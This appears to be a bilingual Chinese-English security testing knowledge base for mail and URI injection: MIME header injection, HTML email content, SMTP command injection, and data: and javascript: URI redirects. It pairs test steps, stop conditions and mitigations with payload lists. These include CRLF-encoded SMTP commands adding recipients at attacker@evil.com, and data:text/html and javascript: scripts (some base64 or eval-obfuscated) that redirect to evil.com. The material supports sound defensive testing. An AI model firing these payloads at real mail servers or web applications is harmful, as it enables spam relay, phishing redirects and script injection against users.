description.en: Replay after structured body and attachment construction to preserve valid multipart content while preventing user-supplied structure headers.

review.rationale: 原内容注入的是邮件 MIME 结构 Header，应归邮件/API 输入安全，而不是 SQL/NoSQL。

prerequisites.zh: 用户输入可进入邮件 MIME Header 区，应用允许换行后创建 Content-Type、MIME-Version 或 Content-Transfer-Encoding，最终 MIME 可检查。
prerequisites.en: User input can enter the mail MIME header section and create Content-Type, MIME-Version, or Content-Transfer-Encoding after a newline, with final MIME inspectable.

prerequisites.zh: 隔离 SMTP sink 使用只含固定文本 marker 的两部分 multipart，对照保存应用正文、boundary、raw MIME、MTA 重写和测试客户端解析树。
prerequisites.en: An isolated SMTP sink uses a two-part multipart containing fixed text markers only and preserves application body, boundary, raw MIME, MTA rewriting, and test-client parse tree.

analysis.zh: 阳性证据是换行在最终邮件中建立攻击者控制的 MIME Header/boundary，并使隔离客户端按不同结构解释 marker 正文；raw MIME 与解析树一致。 假阳性边界：Content-Type 字符串出现在正文、MTA 覆盖为安全类型、boundary 不闭合导致纯文本、客户端猜测 HTML、日志换行或请求 parser 接受值均不是 MIME 注入。
analysis.en: Positive evidence requires the newline to create attacker-controlled MIME headers or boundaries in the final message and make the isolated client interpret marker content under a different structure, with raw MIME matching the parse tree. False-positive boundary: Content-Type text in the body, MTA override to a safe type, an unclosed boundary yielding plain text, client HTML guessing, multiline logs, or request-parser acceptance does not prove MIME injection.

opsecTips.zh: MIME 结构测试只含固定文本，不附加文件/HTML/外链；出现真实附件、客户端脚本、外部投递、邮件循环或解析器资源异常时停止。
opsecTips.en: MIME-structure testing contains fixed text only and no files, HTML, or external links; stop on real attachments, client script, external delivery, mail loops, or parser-resource anomalies.

opsecTips.zh: 删除测试 MIME、队列和客户端副本，清理 boundary/marker 日志与缓存，关闭 sink，恢复安全 MIME builder 并回归。
opsecTips.en: Delete test MIME messages, queues, and client copies, clear boundary and marker logs and caches, close the sink, restore a safe MIME builder, and regress.

name.zh: HTML 邮件正文内容注入

description.zh: 验证用户输入是否未经净化进入 HTML 邮件正文，保留钓鱼链接、iframe、外部样式或跟踪资源并影响收件人客户端。
description.en: Tests whether unsanitized user input enters an HTML email body and preserves phishing links, iframes, external styles, or tracking resources in recipient clients.

subCategory.zh: HTML 邮件活动内容注入

overview.zh: 原集合包含标题、链接、javascript:、iframe、@import、link 和背景资源。多数现代邮件客户端禁止脚本和 iframe，但仍可能保留钓鱼链接、远程跟踪或危险 CSS；必须按支持的客户端分别记录净化结果。
overview.en: The source includes headings, links, javascript schemes, iframes, imports, link elements, and background resources. Most modern mail clients block scripts and iframes, while phishing links, remote tracking, or unsafe CSS can remain, so sanitization results must be recorded per supported client.

vulnerability.zh: 邮件模板若把用户字段当作可信 HTML 拼接，发送端净化与客户端二次解析之间可能保留活动元素、属性或外部资源。由于邮件通常位于独立文档源，影响不应自动等同网站会话 XSS，而应按实际客户端能力描述。
vulnerability.en: If a mail template concatenates user fields as trusted HTML, active elements, attributes, or external resources can survive sender sanitization and client reparsing. Because mail is usually an isolated document origin, impact should not automatically be equated with website-session XSS and must reflect actual client capabilities.

exploitation.zh: 步骤一发送只含转义文本与允许链接的基线邮件；步骤二逐项回放原始 HTML，在 Webmail、桌面和移动客户端记录最终 DOM、资源请求和点击目标；步骤三禁用远程内容并使用纯文本替代部分对照，排除发送端预览、邮件安全网关主动扫描或客户端自动链接造成的假阳性。
exploitation.en: First send a baseline message containing escaped text and one allowed link. Replay each original HTML item and record final DOM, resource requests, and click targets in webmail, desktop, and mobile clients. Compare remote-content-disabled and plain-text alternatives to exclude sender previews, security-gateway scanning, or client autolinking as false positives.

mitigation.zh: 使用严格 allowlist HTML 净化器并删除脚本、iframe、危险协议、外部 CSS 与事件属性；对纯文本和 HTML 部分分别进行上下文编码；为可信邮件限制远程资源域名，并在每个支持客户端回归最终 DOM。
mitigation.en: Use a strict allowlist HTML sanitizer that removes scripts, iframes, dangerous schemes, external CSS, and event attributes. Encode plain-text and HTML parts for their contexts. Restrict remote-resource domains for trusted mail and regress the final DOM in every supported client.

title.zh: 建立多客户端邮件基线

description.zh: 发送转义文本和允许链接，记录网关处理、最终 MIME 与各客户端 DOM。
description.en: Send escaped text and an allowed link and record gateway processing, final MIME, and each client DOM.

title.zh: 回放活动 HTML 元素

description.zh: 提交原始元素集合并按客户端捕获最终 DOM、远程请求、协议和用户交互。
description.en: Submit the original element set and capture final DOM, remote requests, schemes, and user interaction per client.

attackChain.payload:
Injected HTML

Click here Click

description.zh: 部署 allowlist 净化和远程资源限制后重放，确认允许格式保留且活动内容消失。
description.en: Replay after allowlist sanitization and remote-resource restrictions to preserve formatting while removing active content.

review.rationale: 该条是 HTML 邮件内容注入，主要客户端 Sink 属于 XSS/活动内容，但影响必须按邮件客户端而非网站会话描述。

prerequisites.zh: 用户内容未经上下文净化进入 HTML 邮件正文，目标测试邮件客户端对链接、图片、样式、iframe 和脚本的真实策略已确认。
prerequisites.en: User content enters an HTML mail body without contextual sanitization, with actual policies for links, images, styles, frames, and scripts confirmed in the target test mail client.

prerequisites.zh: 只使用隔离邮箱和自有空链接/像素 token，移除 phishing 文案和 javascript 执行，保存 raw MIME、sanitized DOM、资源请求与用户动作。
prerequisites.en: An isolated mailbox and owned empty link or pixel tokens are used, phishing language and javascript execution are removed, and raw MIME, sanitized DOM, resource requests, and user actions are preserved.

analysis.zh: 阳性证据是攻击者 HTML 在目标客户端净化后仍形成非预期活动元素，例如可欺骗链接或自动外部资源请求；脚本 XSS 必须另有实际 marker 执行。 假阳性边界：HTML 邮件正常支持 h1/a、源码含 iframe/script、客户端显示纯文本、外部图片默认阻止、用户必须明确点击安全链接或 Webmail CSP 阻断均不是 XSS。
analysis.en: Positive evidence requires attacker HTML to remain an unintended active element after target-client sanitization, such as a misleading link or automatic external-resource request; script XSS needs separate actual marker execution. False-positive boundary: Normal h1 or link support in HTML mail, iframe or script in source, plain-text display, default image blocking, explicit user click on a safe link, or Webmail CSP blocking does not prove XSS.

opsecTips.zh: HTML 邮件测试不含真实钓鱼、凭据表单、javascript 或第三方像素；出现非测试收件人、自动外连携带数据、脚本、下载或品牌冒用时停止。
opsecTips.en: HTML email testing contains no real phishing, credential forms, javascript, or third-party pixels; stop on nontest recipients, automatic data-bearing egress, script, downloads, or brand impersonation.

opsecTips.zh: 删除隔离邮件/队列/资源 token，清理 Webmail/客户端缓存和访问日志，恢复 HTML sanitizer/CSP 并回归允许标签。
opsecTips.en: Delete isolated messages, queues, and resource tokens, clear Webmail and client caches plus access logs, restore the HTML sanitizer and CSP, and regress allowed tags.

name.zh: SMTP 命令序列注入

description.zh: 验证用户字段中的换行是否突破邮件应用层边界，向下游 SMTP 会话注入 HELO、MAIL FROM、RCPT TO、DATA 或 QUIT 命令。
description.en: Tests whether newlines in user fields escape the mail application boundary and inject HELO, MAIL FROM, RCPT TO, DATA, or QUIT commands into a downstream SMTP session.

overview.zh: 该集合比邮件 Header 注入更低一层，尝试控制 SMTP 会话命令和信封。现代邮件库通常不会把 Header 换行传到命令通道，因此必须在隔离 SMTP 服务器的原始会话日志中看到额外命令，而不是只看 MIME。
overview.en: This set targets a layer below mail-header injection and attempts to control SMTP session commands and the envelope. Modern mail libraries usually do not pass header newlines into the command channel, so extra commands must appear in raw session logs from an isolated SMTP server, not only in MIME.

vulnerability.zh: 自建 SMTP 客户端、命令字符串拼接或协议代理若没有区分参数与 CRLF 分帧，用户输入可结束当前命令并增加收件人或消息。不同服务器状态机会拒绝顺序错误，因此出现 5xx 或连接断开不是成功。
vulnerability.en: A custom SMTP client, command-string concatenation, or protocol proxy that fails to separate arguments from CRLF framing can let user input terminate one command and add recipients or messages. Server state machines may reject invalid ordering, so a 5xx response or disconnect is not success.

exploitation.zh: 步骤一用正常邮件记录 EHLO、MAIL、RCPT、DATA、QUIT 的完整会话顺序；步骤二在隔离捕获服务回放原始命令注入变体，比较客户端发出的真实行和服务器状态；步骤三切换到成熟 SMTP 库后重放，排除 MIME 正文字符串、服务端 banner 或故意测试脚本造成的假阳性。
exploitation.en: First record the complete EHLO, MAIL, RCPT, DATA, and QUIT sequence for a normal message. Replay the original command-injection variants against an isolated capture service and compare actual client lines with server state. Retest with a mature SMTP library to exclude MIME body strings, server banners, or intentionally scripted test commands as false positives.

mitigation.zh: 使用成熟 SMTP 客户端 API 分别设置信封、Header 与正文；拒绝所有协议参数中的 CR/LF 和控制字符并禁止原始命令拼接；限制下游 SMTP 账户的发件域、收件域与速率，并记录异常命令顺序。
mitigation.en: Use a mature SMTP client API that separates envelope, headers, and body. Reject CR, LF, and controls in every protocol argument and prohibit raw command concatenation. Restrict sender and recipient domains and rates for downstream accounts and log anomalous command ordering.

title.zh: 保存正常 SMTP 状态机
title.en: Preserve the normal SMTP state machine

description.zh: 在隔离服务器记录正常邮件的每条客户端命令、服务器回复和状态迁移。
description.en: Record every client command, server reply, and state transition for a normal message on an isolated server.

description.zh: 回放原始 HELO/MAIL/RCPT/DATA 变体并验证是否形成额外有效状态迁移。
description.en: Replay the original HELO, MAIL, RCPT, and DATA variants and verify whether they create additional valid state transitions.

attackChain.payload:
HELO evil.com

HELO evil.com

MAIL FROM:<attacker@evil.com>

MAIL FROM:<attacker@evil.com>

RCPT TO:<attacker@evil.com>

RCPT TO:<attacker@evil.com>
%0aHELO evil.com
%0d%0aHELO evil.com
%0aMAIL FROM:<attacker@evil.com>
%0d%0aMAIL FROM:<attacker@evil.com>
%0aRCPT TO:<attacker@evil.com>
%0d%0aRCPT TO:<attacker@evil.com>

DATA
Subject: Injected

Injected body
.


DATA
Subject: Injected

Injected body
.


QUIT

QUIT
%0aQUIT
%0d%0aQUIT

title.zh: 采用结构化 SMTP 客户端

description.zh: 禁止原始命令拼接后重放，确认正常信封与正文保留且注入行不再离开应用。
description.en: Replay after prohibiting raw command concatenation to preserve normal envelope and body behavior while preventing injected lines from leaving the application.

review.rationale: 原载荷目标是 SMTP 协议状态机与信封命令，应从 SQL 注入纠正为协议命令注入，并与 MIME Header 注入区分。

prerequisites.zh: 用户字段在应用构造 SMTP 会话命令前未拒绝 CR/LF，且下游收到的原始 HELO/MAIL FROM/RCPT TO/DATA/QUIT 序列可抓取。
prerequisites.en: A user field does not reject CR or LF before application construction of SMTP commands, and the downstream raw HELO, MAIL FROM, RCPT TO, DATA, and QUIT sequence is capturable.

prerequisites.zh: 使用不转发邮件的隔离 SMTP transcript sink 和专用 marker 地址，单连接保存应用写入字节、服务器命令解析和队列状态。
prerequisites.en: A nonforwarding isolated SMTP transcript sink and dedicated marker addresses preserve application-written bytes, server command parsing, and queue state on one connection.

analysis.zh: 阳性证据是可控换行结束原应用值并让下游 SMTP parser 接受一个额外独立命令，原始 transcript 和解析事件与输入对应。 假阳性边界：命令字符串出现在邮件正文/日志、SMTP server 返回语法错误、库重新编码换行、连接本就发送正常 HELO/MAIL、额外命令未被 parser 接受或 sink 模拟均不是注入。
analysis.en: Positive evidence requires a controlled newline to terminate the original application value and have the downstream SMTP parser accept an additional distinct command, correlating raw transcript and parse event with input. False-positive boundary: Command text in a body or log, an SMTP syntax error, library newline re-encoding, normal HELO or MAIL commands, an unaccepted extra command, or sink simulation does not prove injection.

opsecTips.zh: SMTP 命令测试仅向不投递 sink 发送一个无害 NOOP/marker，禁止真实 RCPT/DATA；出现外部收件人、排队邮件、多连接、退信或 MTA 状态变化时停止。
opsecTips.en: SMTP command testing sends one harmless NOOP or marker to a nonforwarding sink and forbids real RCPT or DATA; stop on external recipients, queued mail, multiple connections, bounces, or MTA-state changes.

opsecTips.zh: 关闭连接和 transcript sink，删除队列/marker/抓包，清理应用/MTA 日志，恢复命令参数 CRLF 校验并回归正常发送。
opsecTips.en: Close connections and the transcript sink, delete queues, markers, and captures, clear application and MTA logs, restore CRLF validation for command arguments, and regress normal sending.

name.zh: data: URI 重定向活动文档

description.zh: 验证 data:text/html 载荷是否在导航 Sink 中创建活动文档，并通过 meta refresh 或脚本把用户带到外部站点。
description.en: Tests whether a data:text/html input creates an active document in a navigation sink and redirects the user to an external site through meta refresh or script.

subCategory.zh: Data URI 导航脚本执行

overview.zh: 原集合包含 meta refresh、Base64 HTML 与 atob/eval 脚本。与 inject2-uri 相比，这里更集中于活动文档的外部导航行为，但根因仍是 data: 危险协议进入浏览器可执行上下文，而不是服务端 302。
overview.en: The source combines meta refresh, Base64 HTML, and atob or eval script. Compared with the other data-URI set, this one focuses on external navigation from an active document, but the root cause remains a data scheme reaching an executable browser context rather than a server 302.

vulnerability.zh: 链接、iframe 或 location 接受完整用户 URI，而校验器只查找 http 主机或禁止明文 script 时，编码的 data:text/html 仍可创建独立文档并导航。浏览器、CSP 和用户手势决定 meta/script 是否生效，必须真实执行。
vulnerability.en: When a link, iframe, or location accepts a complete user URI and validation only checks HTTP hosts or literal script text, encoded data:text/html can still create a document and navigate. Browser, CSP, and user-gesture behavior determine whether meta or script runs, so real execution is required.

exploitation.zh: 步骤一用 data:text/plain 与普通 HTTPS 导航建立文档和跳转基线；步骤二回放原始 meta/Base64/eval 变体并捕获页面源、CSP、计时和最终 URL；步骤三在纯文本 Sink、禁用 data: 和禁用脚本策略下对照，排除解码预览、地址栏显示或扫描器识别 evil.com 造成的假阳性。
exploitation.en: First establish document and navigation baselines with data:text/plain and ordinary HTTPS. Replay the original meta, Base64, and eval variants and capture page origin, CSP, timing, and final URL. Compare plain-text sinks and policies disabling data and script to exclude decoder previews, address-bar display, or scanner recognition of evil.com as false positives.

mitigation.zh: 导航目标只允许服务端映射或标准解析后的 http/https；拒绝 data:、javascript: 和未知协议，并在解码后再验证；通过 CSP 限制 frame-src、object-src 与 script-src，避免对用户 URI 进行 eval 或字符串执行。
mitigation.en: Allow navigation only through server mappings or parsed HTTP and HTTPS URLs. Reject data, javascript, and unknown schemes and validate after decoding. Restrict frame-src, object-src, and script-src with CSP and never eval or string-execute user URIs.

title.zh: 建立活动文档导航对照

description.zh: 记录 data:text/plain、普通 HTTPS 和无导航 HTML 在目标 Sink 中的浏览器行为。
description.en: Record browser behavior for data:text/plain, ordinary HTTPS, and nonnavigating HTML in the target sink.

title.zh: 执行 meta 与编码脚本

description.zh: 回放原始集合并记录文档创建、脚本或 meta 触发、CSP 决策和最终 URL。
description.en: Replay the original set and record document creation, script or meta trigger, CSP decision, and final URL.

attackChain.payload:
data:text/html,<meta http-equiv="refresh" content="0;url=https://evil.com">
data:text/html;base64,PGRpdiBpZD0idGVzdCI+PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20iPC9zY3JpcHQ+PC9kaXY+
data:text/html,<script>eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tIg=='))</script>

description.zh: 部署协议白名单与 CSP 后重放，确认业务 HTTPS 导航保留而活动 data 文档被拒绝。
description.en: Replay after scheme allowlisting and CSP to preserve business HTTPS navigation while rejecting active data documents.

review.rationale: data:text/html 创建客户端活动文档并通过 meta 或脚本导航，真实类别是 XSS/危险 URI，而非 SQL 注入。

prerequisites.zh: 重定向或导航 Sink 允许 data:text/html，目标浏览器创建活动文档并允许 meta refresh 或脚本改变 location，sandbox/CSP 已确认。
prerequisites.en: A redirect or navigation sink permits data:text/html, and the target browser creates an active document allowing meta refresh or script location changes, with sandbox and CSP confirmed.

prerequisites.zh: data 文档只导航到自有空页面并带唯一 token，不执行 eval；记录初始 Sink、data 文档 origin、meta/script 事件和最终 URL。
prerequisites.en: The data document navigates only to an owned empty page with a unique token and does not use eval, recording initial sink, data-document origin, meta or script event, and final URL.

analysis.zh: 阳性证据是应用接受 data URI，浏览器将其解析为活动文档并由 meta/script 触发到自有目标的实际导航，两个导航阶段可关联。 假阳性边界：data URI 显示/下载、浏览器禁顶层 data、Base64 可解码、脚本被 sandbox/CSP 阻止、外部 URL 只在文本中、手工打开 URI 或普通开放重定向均不是活动链。
analysis.en: Positive evidence requires the application to accept the data URI, the browser to parse it as an active document, and meta or script to trigger actual navigation to the owned target, correlating both navigation stages. False-positive boundary: Displayed or downloaded data URIs, blocked top-level data navigation, decodable Base64, script blocked by sandbox or CSP, an external URL only in text, manual opening, or an ordinary redirect does not prove the active chain.

opsecTips.zh: Data URI 重定向只到自有空页且单次，禁止 opener/top 数据访问、公共域和 eval；出现窗口链、下载、外连数据、历史循环或非测试用户时停止。
opsecTips.en: Data-URI redirect testing navigates once to an owned empty page and forbids opener or top data access, public origins, and eval; stop on window chains, downloads, data-bearing egress, history loops, or nontest users.

opsecTips.zh: 关闭 data/目标文档，删除 URI/token/marker，清理 history/BFCache/站点数据和目标日志，恢复 scheme allowlist。
opsecTips.en: Close data and target documents, delete URIs, tokens, and markers, clear history, BFCache, site data, and destination logs, and restore scheme allowlists.

name.zh: javascript: URI 重定向脚本变体

description.zh: 验证 javascript: URI 中的 window.open、location、eval 和定时器变体能否绕过输入校验并在浏览器中执行外部导航。
description.en: Tests whether window.open, location, eval, and timer variants in javascript URIs bypass input validation and execute external navigation in the browser.

overview.zh: 原集合围绕 javascript: 协议内不同 JavaScript API 和 Base64 解码构造导航。虽然可观察结果是外部跳转，但不存在服务端 Location，漏洞边界是用户 URI 被浏览器当代码执行，因此应归 DOM XSS。
overview.en: The source varies JavaScript APIs and Base64 decoding inside the javascript scheme to construct navigation. Although the visible result is an external redirect, there is no server Location; the boundary is a user URI executed as browser code, so it is DOM XSS.

vulnerability.zh: 应用若只过滤字面 window.location 或按字符串黑名单阻止少量模式，eval、void、setTimeout 和 window.open 等语义等价形式仍可运行。协议解析、HTML 实体、URL 解码和 DOM 赋值顺序共同决定绕过。
vulnerability.en: If an application filters only literal window.location or blacklists a few strings, equivalent forms using eval, void, setTimeout, and window.open may still run. Scheme parsing, HTML entities, URL decoding, and DOM assignment order jointly determine bypass behavior.

exploitation.zh: 步骤一用普通 HTTPS 与被拒绝的基础 javascript:alert 建立协议策略基线；步骤二逐项回放原始 API 变体，记录最终 DOM 值、JavaScript 调用栈、弹窗/导航和 CSP；步骤三用不执行的文本属性、禁用 eval 与严格 CSP 对照，排除字符串回显、弹窗阻止或扫描器模式匹配造成的假阳性。
exploitation.en: First establish scheme-policy baselines with ordinary HTTPS and a rejected basic javascript alert. Replay each original API variant and record final DOM value, JavaScript call stack, popup or navigation, and CSP. Compare a nonexecuting text attribute, eval disabled, and strict CSP to exclude string echo, popup blocking, or scanner-pattern matches as false positives.

mitigation.zh: 只允许业务需要的 http/https 等协议并使用标准 URL 解析器；避免用户值进入 href、src、location 与字符串计时器等代码 Sink，禁止 eval；部署 nonce/hash CSP、Trusted Types 和 DOM XSS 回归覆盖等价 API。
mitigation.en: Allow only business-required schemes such as HTTP and HTTPS through a standard URL parser. Keep user values out of href, src, location, string timers, and other code sinks and prohibit eval. Deploy nonce or hash CSP, Trusted Types, and DOM XSS regressions covering equivalent APIs.

title.zh: 固定危险协议策略基线

description.zh: 记录普通 HTTPS 和基础 javascript: 在目标 DOM Sink 中的解析与 CSP 决策。
description.en: Record parsing and CSP decisions for ordinary HTTPS and a basic javascript URI in the target DOM sink.

description.zh: 提交原始 window/eval/timer 变体并捕获 DOM 属性、调用栈与最终浏览器导航。
description.en: Submit the original window, eval, and timer variants and capture DOM properties, call stacks, and final browser navigation.

attackChain.payload:
javascript:window.open('https://evil.com')
javascript:void(window.location='https://evil.com')
javascript:void(document.location='https://evil.com')
javascript:void(location.href='https://evil.com')
javascript:void(location='https://evil.com')
javascript:eval('window.location="https://evil.com"')
javascript:eval('document.location="https://evil.com"')
javascript:eval(atob('d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tIg=='))
javascript:setTimeout('window.location="https://evil.com"')
javascript:setInterval('window.location="https://evil.com"')

title.zh: 统一协议与代码 Sink 防护

description.zh: 部署协议 allowlist、CSP 和 Trusted Types 后重放，确认允许链接保留且所有等价脚本均失效。
description.en: Replay after scheme allowlisting, CSP, and Trusted Types to preserve allowed links while disabling every equivalent script form.

review.rationale: javascript: 中的多种 API 由浏览器执行，外部导航只是脚本副作用，应从 SQL 注入纠正为 DOM XSS。

prerequisites.zh: 用户值进入可执行 javascript: 导航 Sink，目标浏览器允许 window.open/location/eval/定时器变体，且触发所需用户手势可模拟。
prerequisites.en: A user value reaches an executable javascript: navigation sink, the target browser permits window.open, location, eval, or timer variants, and required user gestures are simulatable.

prerequisites.zh: 所有外部导航替换为自有空页面，eval/定时器只调用固定 marker，记录 DOM 属性、点击/手势、弹窗策略、调用栈和最终 URL。
prerequisites.en: All external navigation points to an owned empty page, eval and timers call only a fixed marker, and DOM attributes, click or gesture, popup policy, call stack, and final URL are recorded.

analysis.zh: 阳性证据是应用真实 Sink 接受 javascript: 变体并在目标页面来源执行 marker 或受控导航；每个 window.open/location/timer 分支需对应触发证据。 假阳性边界：javascript 字符串回显、弹窗被阻止、需控制台手工调用、普通链接导航、CSP 阻止 eval、定时器未触发、URL 解析错误或静态扫描命中均不是成功。
analysis.en: Positive evidence requires the real application sink to accept a javascript: variant and execute the marker or controlled navigation under the target-page origin, with branch-specific evidence for window.open, location, or timers. False-positive boundary: Reflected javascript text, popup blocking, manual console invocation, ordinary link navigation, CSP-blocked eval, an unfired timer, URL parse errors, or static scanner matches does not prove success.

opsecTips.zh: JavaScript URI 变体禁止公共域、真实弹窗链、cookie/storage 和长期定时器；出现多窗口、外连、数据读取、历史循环或非测试会话时停止。
opsecTips.en: JavaScript-URI variants forbid public origins, real popup chains, cookies or storage, and long timers; stop on multiple windows, egress, data reads, history loops, or nontest sessions.

opsecTips.zh: 关闭弹窗/页面，取消测试定时器，删除链接/marker/token，清理 history/BFCache/站点数据和目标日志，恢复协议过滤。
opsecTips.en: Close popups and pages, cancel test timers, delete links, markers, and tokens, clear history, BFCache, site data, and destination logs, and restore scheme filtering.
